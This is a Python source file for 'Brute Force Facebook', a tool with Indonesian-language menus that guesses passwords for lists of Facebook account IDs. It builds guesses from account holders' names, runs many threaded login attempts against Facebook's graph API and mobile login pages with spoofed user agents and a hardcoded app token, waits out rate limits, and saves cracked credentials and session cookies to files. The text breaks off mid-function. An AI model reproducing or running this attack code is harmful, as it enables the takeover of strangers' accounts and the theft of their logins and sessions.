# coding=utf-8

#     *Brute Force Facebook (BFF)²
#     *file name: main.py
#     *copyright: (C) © 2022 ~ Romi Afrizal
#     *contact me on whatsap: +6281273018924

#     *Terimakasih sudah decode script ini tolong jangan di perjual belikan :)*
#     *Thanks for decoding this script, please don't sell it :)*

#--- MODULE IN PYTHON
from xyz import *
from concurrent.futures import ThreadPoolExecutor as Romz_Xyz
from bs4 import BeautifulSoup as parser
from random import randint
from xyz import done as selesai
#--- RICH PROGRESS
from rich.progress import Progress
from rich.progress import BarColumn
from rich.progress import TextColumn
from rich.progress import SpinnerColumn
from rich.tree import Tree

#--- TANGGAL BULAN 
ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month 

waktu = ("{}-{}-{}").format(hari,bulan,tahun)
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

#--- APPEND
user = []
sukses = []
check = []
lopev = 0
til = '•'

#--- MULAI CRACK 
class Crack:
	
	def __init__(self):
		self.id,self.idx,self.ua,self.appk,self.uaxz, self.sec_ch_ua = [],[],[],[],[],[]
		self.url_prok = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
		self.romzz = requests.Session()
		
	#--- EKSEKUSI 
	def romiy(self,id):
		self.idx = id 
		tulis(Panel(f""" {Te}{U}• {P}01{O} Crack dari ID tua\n {U}• {P}02{O} Crack dari ID muda\n {U}• {P}03{O} Crack dari ID acak""",
		title = f'{Te}{M}[ {H}Urutan ID {M}]',style='#FF0022'))
		urut = input('%s╰─ %sPilih %s> %s'%(p,o,m,k))
		if urut in['']:
			exit("%s╰─%s isi yang benar kentod "%(p,m));jeda(2)
		elif urut in['1','01']:
			for kondom in self.idx:
				self.id.append(kondom)
		elif urut in['2','02']:
			for kondom in self.idx:
				self.id.insert(0,kondom)
		else:
			for kondom in self.idx:
				acak = random.randint(0,len(self.id))
				self.id.insert(acak,kondom)
		self.useragent()
		if 'mengontol' in self.uaxz:
			tulis(Panel(f""" {Te}{U}• {P}01{O} Gunakan pass manual\n {U}• {P}02{O} Gunakan pass otomatis\n {U}• {P}03{O} Gunakan pass gabungan""",
			title = f'{Te}{M}[ {H}Password {M}]',style='#FF0022'))
			unikersx = input('%s╰─ %sPilih %s> %s'%(p,o,m,k))
			if unikersx in ('01', '1'):
				self.manualx()
			elif unikersx in ('2', '02'):
				tulis(Panel(f""" {Te}{U}• {P}01{O} login{M} b-api{O} (cepat)\n {U}• {P}02{O} login{P} mbasic{O} (lambat)\n {U}• {P}03{O} login{H} mobile{O} (sangat lambat) {H}disarankan""",title = f'{Te}{M}[ {H}Login facebook {M}]',style='#FF0022'))
				self.langsungx()
			elif unikersx in ('3', '03'):
				self.gabunganx()
			else:
				exit("%s╰─%s isi yang benar "%(p,m));jeda(2)
		else:
			pass 
		#--- pilih password
		tulis(Panel(f""" {Te}{U}• {P}01{O} Gunakan pass manual\n {U}• {P}02{O} Gunakan pass otomatis\n {U}• {P}03{O} Gunakan pass gabungan""",
		title = f'{Te}{M}[ {H}Password {M}]',style='#FF0022'))
		unikers = input('%s╰─ %sPilih %s> %s'%(p,o,m,k))
		if unikers in ('01', '1'):
			self.manual()
		elif unikers in ('02', '2'):
			tulis(Panel(f""" {Te}{U}• {P}01{O} login{M} b-api{O} (cepat)\n {U}• {P}02{O} login{P} mbasic{O} (lambat)\n {U}• {P}03{O} login{H} mobile{O} (sangat lambat) {H}disarankan""",title = f'{Te}{M}[ {H}Login facebook {M}]',style='#FF0022'))
			self.langsung()
		elif unikers in ('03', '3'):
			self.gabungan()
		else:
			exit("%s╰─%s isi yang benar "%(p,m));jeda(2)
			
	#--- SETTING APLIKASI
	def set_pepek(self):
		sleeh = input('%s╰─%s tampilkan aplikasi yang terkait? y/t%s > %s'%(p,o,m,k))
		if sleeh in['y','Y']:
			self.appk.append('okeh')
		elif sleeh in['t','T']:
			pass
		else:
			exit("%s╰─%s isi yang benar "%(p,m));jeda(2)
			
	#--- SETTING USER AGENT
	def useragent(self):
		x = input('%s╰─%s gunakan user-agent bawaan script? y/t%s > %s'%(p,o,m,k))
		if x == '':
			exit ('%s╰─%s isi yang benar'%(p,m));jeda(2)
		elif x in["t","T"]:
			self.uaxz.append("mengontol")
			tulis(Panel(f"{Te}{U} •{O} Ketik {H}My user agent{O} di browser google chrome\n {U}•{O} untuk mendapatkan user agent hp anda",style='#FF0022'))
			try:
				xix = input("%s╰─%s masukan user agent %s> %s"%(p,o,m,h))
				if xix in[""]:
					try:
						kontol = self.user_agentAPI()
						open('ugent.txt','w').write(kontol)
					except:
						pass
				else:
					open('ugent.txt','w').write(xix)
			except:
				pass
		elif x in["cek","CEK","Cek"]:
			try:
				kontol = open('ugent.txt', 'r').read();jeda(2)
			except (FileNotFoundError,IOError):
				kontol = '-'
			tulis(Panel(f"{Te}{O}{kontol}",title=f"{Te}{M}[{H} User agent anda{M} ]",style='#FF0022'))
		else:
			pass
			
	#--- 48 USER AGENT 
	def user_agentAPI(self):
		ugent =[
			"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 5.0.1; GT-I9500) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.117 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 7.0; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36"
			"Mozilla/5.0 (Linux; U; Android 12; en-US; SM-A2829J) AppleWebKit/537.36 (KHTML, like Gecko)  UCBrowser/11.3.8.976 U3/0.8.0 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 10; Pixel Build/QP1A.190711.019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]",
			"Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3396.81 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12",
			"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 5.1.1; Navori QL Stix 3500 Build/LMY49F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Safari/537.36","Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36",
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36","Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE5-00/071.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.26 Mobile Safari/533.4 3gpp-gba",
			"Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]",
			"[FBAN/FB4A,FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI,.FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19.FBCA/armeabi-v7a:armeabi,]",
			"Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]",
			"Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
			"NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)","Mozilla/5.0 (Series40; Nokia501/1.0; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.0.0.0.67",
			"Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 Nokia5800d-1/60.0.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4","Mozilla/5.0 (Series40; NokiaX2-02/10.90; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/1.0.2.26.11",
			"Mozilla/5.0 (Symbian/3; Series60/5.3 NokiaE7-00/111.040.1511; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1","Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 Nokia5230/51.0.002; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4", 
			"Mozilla/5.0 (Symbian/3; Series60/5.3 NokiaC6-01/111.040.1511; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1", "Mozilla/5.0 (Series40; Nokia205.1/04.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", 
			"Mozilla/5.0 (Series40; Nokia303/14.87; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Symbian/3; Series60/5.3 Nokia500/111.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1","Mozilla/5.0 (Series40; Nokia110/03.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.2.62.10",
			"Mozilla/5.0 (Series40; Nokia200/11.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia205/03.18; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45","Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaC5-06/23.6.015; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4", 
			"Mozilla/5.0 (Series40; Nokia200/11.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia208/03.39; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45","Mozilla/5.0 (Series40; Nokia2700c-2/07.80; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45",
			"Mozilla/5.0 (Series40; Nokia205/03.19; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45",  "Mozilla/5.0 (Series40; Nokia205.1/04.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia201/11.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.2.68.14",
		]
		rand_ua = random.choice(ugent)
		return rand_ua 
	#--- UA B-API GRAPH 
	def GETAGENT(self):
		android_version = random.choice([
			'1.0', '1.1','1.2', '1.5', '1.6', '2.0','2.1', '2.2','2.2.1','2.2.2','2.2.3', '2.3','2.3.1','2.3.2','2.3.3','2.3.4','2.3.5','2.3.6','2.3.7', 
			'3.0','3.1','3.2','3.2.1','3.2.2','3.2.3','3.2.4','3.2.5','3.2.6', '4.0','4.0.1','4.0.2','4.0.3','4.0.4', '4.1','4.1.1','4.1.2','4.2','4.2.1','4.2.2','4.3', '4.4', 
			'5.0','5.1.1', '6.0','6.0.1', '7.0','7.1.1','7.1.2', '8.0','8.1.0','8.1.1', '9','9.0', '10', '11', '12', '13' 
			])
		android_perangkat = random.choice([
			'GT-I9190','KOT49H','GT-I9192','KOT49H','GT-I9300I','KTU84P','GT-I9300','IMM76D','GT-I9300','JSS15J','GT-I9301I','KOT4','GT-I9301I','KOT49H','GT-I9500','JDQ39',
			'GT-I9500','LRX22C','GT-N5100','JZO54K','GT-N7100','KOT49H','GT-N8000','JZO54K','GT-N8000','KOT49H','GT-P3110','JZO54K','GT-P5100','IML74K','GT-P5100',
			'JDQ','GT-P5100','JDQ39','GT-P5100','JZO54K','GT-P5110','JDQ39','GT-P5200','KOT49H','GT-P5210','KOT49H','GT-P5220','JDQ39','GT-S7390','JZO54K','SAMSUNG','SM-A500F',
			'SAMSUNG','SM-G532F','SAMSUNG','SM-G920F','SAMSUNG','SM-G935F','SAMSUNG','SM-J320F','SAMSUNG','SM-J510FN','SAMSUNG','SM-N920S','SAMSUNG','SM-T280',
			'SM-A500FU','MMB29M','SM-A500F','LRX22G','SM-A500F','MMB29M','SM-A500H','MMB29M','SM-G900F','KOT49H','SM-G920F','MMB29K','SM-G920F','NRD90M',
			'SM-G930F','NRD90M','SM-G935F','MMB29K','SM-G935F','NRD90M','SM-G950F','NRD90M','SM-J320FN','LMY47V','SM-J320F','LMY4','SM-J320F','LMY47V','SM-J320H',
			'LMY47V','SM-J320M','LMY47V','SM-J510FN','MMB29M','SM-J510FN','NMF2','SM-J510FN','NMF26X','SM-J510FN','NMF26X;','SM-J701F','NRD90M;','SM-T111','JDQ39',
			'SM-T230','KOT49H','SM-T231','KOT49H','SM-T235','KOT4''SM-T310','KOT49H','SM-T311','KOT4','SM-T311','KOT49H','SM-T315','JDQ39','SM-T525','KOT49H','SM-T531','KOT49H',
			'SM-T531','LRX22G','SM-T535','LRX22G','SM-T555','LRX22G','SM-T561','KTU84P','SM-T705','LRX22G','SM-T705','LRX22G','SM-T805','LRX22G','SM*T820','NRD90M','SPH-L720','KOT49H'
			])
		application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(1,50))+str(random.randint(40,555))
		application_version_code = str(random.randint(000000000,999999999))
		browser_fbs = random.choice(['com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite'])
		user_agent_string = f'Dalvik/2.1.0 (Linux; U; Android {str(android_version)}; {str(android_perangkat)} Build/{str(android_perangkat)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=1.5,width=480,height=800}'+f';FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/{str(browser_fbs)};FBDV/{str(android_perangkat)};FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]'
		return user_agent_string 
	
	#--- MANUAL PASS
	def manual(self): 
		global prog,des 
		tulis(Panel(f'{Te}{U} •{O} contoh{M} >{O} sayang{M},{O}pengen{M},{O}ngentod',style='#FF0022'))
		pwek = input('%s╰─%s password %s> %s'%(p,o,m,k))
		if pwek == '':
			exit('%s╰─%s jangan kosong'%(p,m))
		elif len(pwek)<=5:
			exit('%s╰─%s password minimal 6 karakter'%(p,m))
		else:
			pass 
		tulis(Panel(f""" {Te}{U}• {P}01{O} login{M} b-api{O} (cepat)\n {U}• {P}02{O} login{P} mbasic{O} (lambat)\n {U}• {P}03{O} login{H} mobile{O} (sangat lambat) {H}disarankan""",title = f'{Te}{M}[ {H}Login facebook {M}]',style='#FF0022'))
		sluut = input('%s╰─ %sPilih %s> %s'%(p,o,m,k))
		self.set_pepek()
		tulis(Panel(f'{Te}{U} {til}{O} akun {H}[OK] {O}tersimpan ke file {M}> {H}OK/{waktu}.txt \n{U} {til}{O} akun {K}[CP] {O}tersimpan ke file {M}> {K}OK/{waktu}.txt \n {U}!{O} setiap crack 1k ID, mainkan mode pesawat 2 detik',style='#FF0022'))
		prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
		des = prog.add_task('',total=len(self.id))
		with prog:
			with Romz_Xyz(max_workers=30) as titid:
				for akun in self.id:
					pwx = []
					uid = akun.split('<=>')[0]
					pwx = pwek.split(",")
					if sluut in[""," "]:
						exit("%s╰─%s Isi yang benar kentod "%(p,m));jeda(2)
					elif sluut in ["1","01"]:
						titid.submit(self.Graphapi, uid, pwx, "graph.facebook.com")
					elif sluut in ["2","02"]: 
						titid.submit(self.Cracker, uid, pwx, "mbasic.facebook.com")
					elif sluut in ["3","03"]: 
						titid.submit(self.Cracker, uid, pwx, "m.facebook.com")
					else:
						exit("%s╰─%s Isi yang benar kentod "%(p,m));jeda(2)
						
		selesai.hasil(sukses,check)
	 
	#--- LANGSUNG
	def langsung(self): 
		global prog,des 
		sluut = input('%s╰─ %sPilih %s> %s'%(p,o,m,k))
		self.set_pepek()
		tulis(Panel(f'{Te}{U} {til}{O} akun {H}[OK] {O}tersimpan ke file {M}> {H}OK/{waktu}.txt \n{U} {til}{O} akun {K}[CP] {O}tersimpan ke file {M}> {K}OK/{waktu}.txt \n {U}!{O} setiap crack 1k ID, mainkan mode pesawat 2 detik',style='#FF0022'))
		prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
		des = prog.add_task('',total=len(self.id))
		with prog:
			with Romz_Xyz(max_workers=30) as titid:
				for akun in self.id:
					pwx = []
					uid, name = akun.split("<=>")
					na = name.split(' ')
					if len(na) == 3 or len(na) == 4 or len(na) == 5 or len(na) == 6:
						pwx.append(name)
						pwx.append(na[0]+"123")
						pwx.append(na[0]+"12345")
					else:
						pwx.append(name)
						pwx.append(na[0]+"123")
						pwx.append(na[0]+"12345")
					if sluut in[""," "]:
						exit("%s╰─%s isi yang benar "%(p,m));jeda(2)
					elif sluut in ["1","01"]:
						titid.submit(self.Graphapi, uid, pwx, "graph.facebook.com")
					elif sluut in ["2","02"]: 
						titid.submit(self.Cracker, uid, pwx, "mbasic.facebook.com")
					elif sluut in ["3","03"]: 
						titid.submit(self.Cracker, uid, pwx, "m.facebook.com")
					else:
						exit("%s╰─%s isi yang benar "%(p,m));jeda(2)
						
		selesai.hasil(sukses,check)
	
	#--- PASS GABUNGAN 
	def gabungan(self): 
		global prog,des 
		tulis(Panel(f'{Te}{U} •{O} contoh{M} >{O} sayang{M},{O}pengen{M},{O}ngentod',style='#FF0022'))
		pwek = input('%s╰─%s password %s> %s'%(p,o,m,k))
		if pwek == '':
			exit('%s╰─%s jangan kosong'%(p,m))
		elif len(pwek)<=5:
			exit('%s╰─%s password minimal 6 karakter'%(p,m))
		else:
			pass 
		tulis(Panel(f""" {Te}{U}• {P}01{O} login{M} b-api{O} (cepat)\n {U}• {P}02{O} login{P} mbasic{O} (lambat)\n {U}• {P}03{O} login{H} mobile{O} (sangat lambat) {H}disarankan""",title = f'{Te}{M}[ {H}Login facebook {M}]',style='#FF0022'))
		sluut = input('%s╰─ %sPilih %s> %s'%(p,o,m,k))
		self.set_pepek()
		tulis(Panel(f'{Te}{U} {til}{O} akun {H}[OK] {O}tersimpan ke file {M}> {H}OK/{waktu}.txt \n{U} {til}{O} akun {K}[CP] {O}tersimpan ke file {M}> {K}OK/{waktu}.txt \n {U}!{O} setiap crack 1k ID, mainkan mode pesawat 2 detik',style='#FF0022'))
		prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
		des = prog.add_task('',total=len(self.id))
		with prog:
			with Romz_Xyz(max_workers=30) as titid:
				for akun in self.id:
					pwx = []
					uid, name = akun.split("<=>")
					na = name.split(' ')
					gb = pwek.split(',')
					if len(na) == 3 or len(na) == 4 or len(na) == 5 or len(na) == 6:
						pwx.append(name)
						pwx.append(na[0]+"123")
						pwx.append(na[0]+"12345")
					else:
						pwx.append(name)
						pwx.append(na[0]+"123")
						pwx.append(na[0]+"12345")
						pwx.append(gb)
					if sluut in[""," "]:
						exit("%s╰─%s Isi yang benar kentod "%(p,m));jeda(2)
					elif sluut in ["1","01"]:
						titid.submit(self.Graphapi, uid, pwx, "graph.facebook.com")
					elif sluut in ["2","02"]: 
						titid.submit(self.Cracker, uid, pwx, "mbasic.facebook.com")
					elif sluut in ["3","03"]: 
						titid.submit(self.Cracker, uid, pwx, "m.facebook.com")
					else:
						exit("%s╰─%s Isi yang benar kentod "%(p,m));jeda(2)
						
		selesai.hasil(sukses,check)
	
	#--- MULAI COLAY 
	def Graphapi(self, user, peweh, url_log):
		try:
			global sukses,check,lopev 
			prog.update(des,description=f'{Te}{P}graph-api {H}[OK{M}:{H}{len(sukses)}]{O}-{K}[CP{M}:{K}{len(check)}] {O}{str(lopev)}{P}/{O}{len(self.id)}')
			prog.advance(des)
			for xyz_ in peweh:
				ses = requests.Session()
				pw = xyz_.lower()
				headers_ = {
					"Host": f"{url_log}",
					"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
					"x-fb-sim-hni": str(random.randint(20000, 40000)), 
					"x-fb-net-hni": str(random.randint(20000, 40000)), 
					"x-fb-connection-quality": "EXCELLENT", 
					"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
					"user-agent": self.GETAGENT(), 
					"content-type": "application/x-www-form-urlencoded", 
					"accept-encoding": "gzip, deflate",
					"x-fb-http-engine": "Liger"
				}
				params_ = {
					"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
					"format": "JSON",
					"sdk_version": {random.randint(1,26)}, 
					"email":user,
					"locale": "en_US",
					"password":pw,
					"sdk": "android",
					"generate_session_cookies": "1",
					"sig": "4f648f21fb58fcd2aa1c65f35f441ef5"
				}
				send = ses.post(f"https://{url_log}/auth/login", params=params_, headers=headers_) 
				if "session_key" in send.text and "EAA" in send.text:
					kukis = ";".join(x["name"]+"="+x["value"] for x in send.json()["session_cookies"])
					tree = Tree(" ")
					tree.add(f"{Te}{H}{user} ◊ {pw}")
					tree.add(f"{Te}{H}{kukis}")
					tree.add(f"{Te}{H}{self.GETAGENT()}")
					tulis(tree)
					os.popen("play-audio data/dapet.mp3")
					sukses.append(f'{user} ◊ {pw} ◊ {kukis}')
					open(f'OK/{waktu}.txt', 'a').write(f' *--> {user} ◊ {pw} ◊ {kukis}\n')
					break 
				elif "User must verify their account" in send.text: #or "Untuk Sementara Akun Tidak Tersedia" in send.text:
					tree = Tree(" ")
					tree.add(f"{Te}{K}{user} ◊ {pw}")
					tree.add(f"{Te}{K}{self.GETAGENT()}")
					tulis(tree)
					os.popen("play-audio data/dapet.mp3")
					check.append(f"{user} ◊ {pw}")
					open(f'CP/{waktu}.txt', 'a').write(f" *--> {user} ◊ {pw} \n")
					break 
				elif "Calls to this api have exceeded the rate limit. (613)" in send.text: 
					prog.update(des,description=f'{Te}{M}terkena spam {H}[OK{M}:{H}{len(sukses)}]{O}-{K}[CP{M}:{K}{len(check)}] {O}{str(lopev)}{P}/{O}{len(self.id)}')
					prog.advance(des)
					time.sleep(30)
				else:
					continue
					
			lopev +=1
		except requests.exceptions.ConnectionError:
			time.sleep(6)
			self.Graphapi(user, peweh, url_log) 
			
	#--- mentod m.fb & mbasic.fb
	def Cracker(self, user, peweh, url_log):
		try:
			global sukses,check,lopev 
			prog.update(des,description=f'{Te}{P}async {H}[OK{M}:{H}{len(sukses)}]{O}-{K}[CP{M}:{K}{len(check)}] {O}{str(lopev)}{P}/{O}{len(self.id)}')
			prog.advance(des)
			for xyz_ in peweh:
				pw = xyz_.lower()
				ses = requests.Session()
				vers_android = random.randint(9,13)
				vers_client = random.randint(102,108)
				plat_ch_ua = ['Linux','Android'] #'Chrome OS','Chromium OS','iOS','macOS','Windows','Unknown'
				vers_chrome = [
					'102.0.5005.125','103.0.5060.53','103.0.5060.70','103.0.5060.71','103.0.5060.129','104.0.5112.69','104.0.5112.97','105.0.5195.68','105.0.5195.77','105.0.5195.79',
					'105.0.5195.124','105.0.5195.136','106.0.5249.65','106.0.5249.79','106.0.5249.126','107.0.5304.91','107.0.5304.105','107.0.5304.141','108.0.5359.61','108.0.5359.128'
					]
				model_phone = ['',
					'; SM-A205U','; SM-A102U','; SM-G960U','; SM-N960U','; SAMSUNG SM-T800','; SAMSUNG SM-N915G','; SAMSUNG SM-G925F','; SAMSUNG SM-Z130H','; LM-Q720','; LM-X420','; LM-Q710(FGN)','; SAMSUNG SM-G360T1','; SAMSUNG SM-A800F','; SM-A2829J','; SAMSUNG SM-G780G',
					'; SM-G981B','; SM-N976V','; SAMSUNG SM-G977N','; SM-G975F','; SM-G970F','; SAMSUNG SM-F900U','; SAMSUNG SM-Z910F','; SM-A805F','; SM-A505F','; SAMSUNG SM-G900F','; SAMSUNG SM-F900V','; SAMSUNG SM-A500FU/A500FUXXU1BOJ1','; SM-J330G','; SM-G935F',
				]
				ugent_string = [
					f'Mozilla/5.0 (Linux; Android {str(vers_android)}{str(random.choice(model_phone))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(random.choice(vers_chrome))} Mobile Safari/537.36',
					f'Mozilla/5.0 (Android {str(vers_android)}; Mobile; rv:68.0) Gecko/68.0 Firefox/{str(vers_client)}.0',
					f'Mozilla/5.0 (Android {str(vers_android)}; Mobile; LG-M255; rv:{str(vers_client)}.0) Gecko/{str(vers_client)}.0 Firefox/{str(vers_client)}.0'
					]
				user_agent = random.choice(ugent_string)
				#ses.headers.update({"Host": f"{url_log}","upgrade-insecure-requests": "1","user-agent": user_agent,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "XMLHttpRequest", "sec-fetch-site": "none", "sec-fetch-mode": "navigate", "sec-fetch-user": "?1", "sec-fetch-dest": "document", "accept-encoding": "gzip, deflate", "accept-language":  "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
				ling = ses.get(f'https://{url_log}/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text 
				dataa ={
					'lsd':re.search('name="lsd" value="(.*?)"', str(ling)).group(1),
					'jazoest':re.search('name="jazoest" value="(.*?)"', str(ling)).group(1),
					'm_ts': re.search('name="m_ts" value="(.*?)"',str(ling)).group(1),
					'li': re.search('name="li" value="(.*?)"',str(ling)).group(1),
					'try_number': re.search('name="try_number" value="(.*?)"',str(ling)).group(1),
					'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"',str(ling)).group(1),
					"email":user,"pass":pw,
					'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 
					'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(ling)).group(1),
					'_fb_noscript': re.search('name="_fb_noscript" value="(.*?)"',str(ling)).group(1)
				}
				sooz ={
					'Host': url_log,
					'content-length': f"{len(str(dataa))}",
